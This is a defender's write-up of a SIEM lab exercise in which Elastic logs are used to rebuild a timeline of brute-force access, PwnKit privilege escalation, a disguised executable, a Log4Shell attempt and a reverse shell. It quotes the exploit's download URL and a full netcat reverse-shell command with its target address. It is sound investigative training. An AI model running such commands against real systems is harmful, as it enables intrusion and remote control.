# Elastic Case - Malware Investigation


## Tools and Environment 
Platform: Cyberdefenders  
Tools: Elastic SIEM in a simulated lab environment  


## Lab Scenario Context
An employee was tricked into downloading and running a malicious file. 

On top of that, the systems were not updated and the attacker was able to pivot to another system. 


## Attack Timeline

### [Early Windows Observations]  

Feb 2, 2022 @ 16:58:17 - rundll32.exe accesses registry key HKLM\SYSTEM\ControlSet001\Control\Lsa\  


Feb 2, 2022 @ 17:08:46 - Powershell (pid 11676) creates file "__PSScriptPolicyTest_bymwxuft.3b5.ps1"  


Feb 2, 2022 @ 17:10:47 - Parent process "rundll32.exe" spawns cmd under NT AUTHORITY privileges.   


Feb 2, 2022 @ 17:12:54 - Powershell (pid 8836) changes filename "ModuleAnalysisCache"  


### [Phase 1 - Linux Compromise and Privilege Escalation]

Feb 2, 2022 @ 17:43:45 - A brute force attack successfully logged onto user "salem"  


Feb 2, 2022 @ 17:44:55 - Attacker downloaded exploit "https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py" from GitHub repo using wget.   


Feb 2, 2022 @ 17:45:06 - After running the exploit, new process "pkexec" spawns  


Feb 2, 2022 @ 17:46:16 - The attacker gets an interactive shell by running command "bash -i" on process id 3011 with the root user.   


### [Phase 2 - Windows Malicious File Activity]   

Feb 2, 2022 @ 18:08:25 - Employee "ahmed" downloads the malicious file "Acount_details.pdf.exe" on host DESKTOP-Q1SL9P2   


Feb 2, 2022 @ 18:08:26 - The privileged user cybery runs the same malicious executable on host DESKTOP-Q1SL9P2.


Feb 2, 2022 @ 18:08:26 - A file creation event records mCblHDgWP.dll (8,704 bytes) on the Windows workstation during activity associated with cybery.


### [Phase 3 - Log4Shell Exploitation Attempt]  

Feb 3, 2022 @ 01:51:04 - Attacker delivers a JNDI payload through an Apache Solr endpoint in an attempt to exploit Log4Shell (CVE-2021-44228) and achieve remote code execution.


### [Phase 4 - Reverse Shell Attempt]   

Feb 3, 2022 @ 01:57:21 - Attacker executes nc -e /bin/bash 192.168.1.10 9999 to initiate a reverse-shell connection.

Feb 3, 2022 @ 02:09:22 - User "solr" runs netcat on host "CentOS"

## Conclusion
The investigation identified multiple instances of malicious activity involving malicious file execution, unauthorized access, privilege escalation, and exploitation attempts against vulnerable systems.

The initial attack scenario involved an employee being deceived into downloading and executing a malicious file. SIEM logs revealed execution of a suspicious executable, Acount_details.pdf.exe, on a Windows workstation, consistent with the reported initial access method.

Additional findings included a successful brute-force login to a Linux account, followed by exploitation of CVE-2021-4034 (PwnKit) to obtain root privileges. The investigation also identified an attempted exploitation of CVE-2021-44228 (Log4Shell) against an Apache Solr service, followed by activity consistent with an attempted reverse shell.

Although these findings demonstrate multiple attack techniques, the available evidence does not establish a complete lateral movement path connecting every event. Notably, the observed Linux compromise occurred before the documented Windows executable activity.

Overall, the investigation highlights the risks associated with social engineering, compromised credentials, and unpatched vulnerabilities.

## Key Findings 
1. Multiple accounts involved in malicious activity: The Linux account salem was compromised through a brute-force attack, while Windows accounts ahmed and cybery were associated with malicious executable activity. The documented timeline did not establish the complete sequence connecting these events.
2. Malicious file disguised as a PDF: The executable Acount_details.pdf.exe used a misleading double extension to appear as a legitimate PDF document.
3. Privileged account exposure: The malicious executable ran under the privileged account cybery, potentially increasing the impact of the attack.
4. Earlier activity requiring investigation: Events involving rundll32.exe and PowerShell were identified before the more clearly established attack stages. Additional investigation would be required to determine whether these events were malicious.
5. Reverse-shell activity: A Netcat command was executed in an attempt to establish remote shell access to the private IP address 192.168.1.10 on port 9999. The available evidence does not independently confirm that the connection succeeded.



## Lessons Learned 
1. Context is critical in investigations. Each finding builds on the previous one. Understanding how questions and events connect to each other is what separates 
isolated observations from a coherent attack narrative.

2. Chronological ordering reveals important relationships and gaps. Sorting events by timestamp rather than investigation order revealed that the Linux compromise occurred before the documented Windows malware activity. This emphasized the importance of validating event sequences rather than assuming all suspicious activity follows a single attack chain.

3. Kibana as an investigative tool. I gained hands-on experience navigating Kibana's Discover view, alert dashboard, and process tree analyzer to pivot across multiple 
log sources and reconstruct attacker activity.

